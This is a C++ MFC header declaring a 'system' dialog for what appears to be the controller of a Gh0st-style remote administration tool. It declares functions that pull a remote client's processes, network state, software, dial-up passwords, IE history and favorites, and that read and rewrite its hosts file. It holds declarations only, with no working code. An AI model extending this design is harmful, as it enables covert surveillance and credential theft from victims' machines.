
#pragma once

// SystemDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

class CSystemDlg : public CDialog
{
	// Construction
public:

	CSystemDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	// Dialog Data
		//{{AFX_DATA(CSystemDlg)
	enum { IDD = IDD_SYSTEM };
	CEdit	m_edit_hosts;
	CListCtrl m_list_systeminfo;
	CListCtrl m_list_process;
	CListCtrl m_list_windows;
	CListCtrl m_list_netstate;
	CListCtrl m_list_software;
	CListCtrl m_list_dialupass;
	CListCtrl m_list_iehistory;
	CListCtrl m_list_iefavorite;
	CListCtrl m_list_net;
	CListCtrl m_list_yingjian;
	CListCtrl m_list_qidong;

	CProgressCtrl m_MemPross;
	CProgressCtrl m_CpuPross;
	CTabCtrl	m_tab;
	CString	m_CpuUsed;
	CString	m_MemUsed;
	//}}AFX_DATA
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	SEU_QQwry m_SQQwry;          //ip位置
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSystemDlg)
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:
	CImageList* m_image;  //图标
private:
	void AdjustList();
	void ShowSystemInfo();
	void ShowProcessList();
	void ShowWindowsList();
	void ShowNetStateList();
	void ShowSoftWareList();
	void ShowDialupassList();
	void ShowIEHistoryList();
	void ShowFavoritesUrlList();
	void ShowHostsInfo();
	void ShowSelectWindow(BOOL bInit = FALSE);

	void GetSystemInfo();
	void GetProcessList();
	void GetWindowsList();
	void GetNetStateList();
	void GetSoftWareList();
	void GetDialupassList();
	void GetIEhistoryList();
	void GetFavoritesUrlList();
	void GetHostsInfo();
	void GetCpuMemory();

	void ShowNetconfigList();
	void GetNetconfigList();

	void ShowHardwareList();
	void GetHardwareList();

	void ShowStartupList();
	void GetStartupList();

	void SetClipboardText(CString& Data);
	void CreateSortIcons();
	void SetSortIcon();
	HICON m_hIcon;

	CImageList m_ImgList;
	BOOL m_bClosing;
	// Generated message map functions
	//{{AFX_MSG(CSystemDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnKillProcess();
	afx_msg void KillProcessDel(BYTE Buffer, char* strbuf);
	afx_msg void OnKillDelete();
	afx_msg void OnRefreshPsList();
	afx_msg void OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnNMRClickListProcess(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnWindowReflush();
	afx_msg void OnWindowClose();
	afx_msg void OnWindowHide();        //隐藏
	afx_msg void OnWindowShow();        //显示
	afx_msg void OnWindowMax();         //最大化
	afx_msg void OnWindowMin();         //最小化
	afx_msg void OnReceiveCpuMemory(void);
	afx_msg void OnShowWindow(int Show);
	afx_msg void OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMenuitem40015();
	afx_msg void OnMenuitem40016();
	afx_msg void OnMenuitem40017();
	afx_msg void OnMenuitem40018();
	afx_msg void OnMenuitem40019();
	afx_msg void OnMenuitem40020();
	afx_msg void OnBtnGethosts();
	afx_msg void OnBtnSethosts();
	afx_msg void OnChangeEdtHosts();
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
public:
	CButton m_gethosts;
	CButton m_sethosts;


};